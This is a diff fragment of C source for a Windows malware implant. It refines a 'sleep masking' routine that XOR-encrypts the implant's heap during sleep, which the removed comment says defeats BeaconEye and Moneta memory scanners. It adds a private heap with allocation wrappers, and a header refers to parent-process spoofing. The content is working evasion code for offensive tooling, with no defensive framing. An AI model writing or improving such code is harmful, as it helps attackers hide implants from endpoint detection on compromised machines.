@@ -284,14 +284,35 @@ HANDLE GetSpoofParentHandle(VOID) {
 
 // =============================================
 // 5. SLEEP MASKING (Heap Encryption)
-// XOR-encrypt every live heap block before sleeping, restore after.
-// Defeats BeaconEye / Moneta heap scanning while the implant is idle.
+// XOR-encrypt all live blocks on the implant's private heap before sleeping.
+// Using a private heap (not GetProcessHeap) avoids corrupting CRT internals.
+// Call ImplantHeapInit() once at startup, then use ImplantAlloc/ImplantFree
+// for all implant allocations that should be masked during sleep.
 // =============================================
+
+static HANDLE g_hImplantHeap = NULL;
+
+BOOL ImplantHeapInit(VOID) {
+    g_hImplantHeap = HeapCreate(0, 0, 0);
+    return (g_hImplantHeap != NULL);
+}
+
+PVOID ImplantAlloc(SIZE_T size) {
+    if (!g_hImplantHeap) return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
+    return HeapAlloc(g_hImplantHeap, HEAP_ZERO_MEMORY, size);
+}
+
+VOID ImplantFree(PVOID ptr) {
+    if (!g_hImplantHeap || !ptr) return;
+    HeapFree(g_hImplantHeap, 0, ptr);
+}
+
 VOID MaskedSleep(DWORD dwMs) {
     BYTE bKey = 0;
     BCryptGenRandom(NULL, &bKey, 1, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    if (bKey == 0) bKey = 0xAB; // ensure non-zero key
 
-    HANDLE hHeap = GetProcessHeap();
+    HANDLE hHeap = g_hImplantHeap ? g_hImplantHeap : GetProcessHeap();
     PROCESS_HEAP_ENTRY he = { 0 };
 
     HeapLock(hHeap);
@@ -306,7 +327,6 @@ VOID MaskedSleep(DWORD dwMs) {
 
     Sleep(dwMs);
 
-    // Restore: XOR back with same key (symmetric)
     ZeroMemory(&he, sizeof(he));
     HeapLock(hHeap);
     while (HeapWalk(hHeap, &he)) {
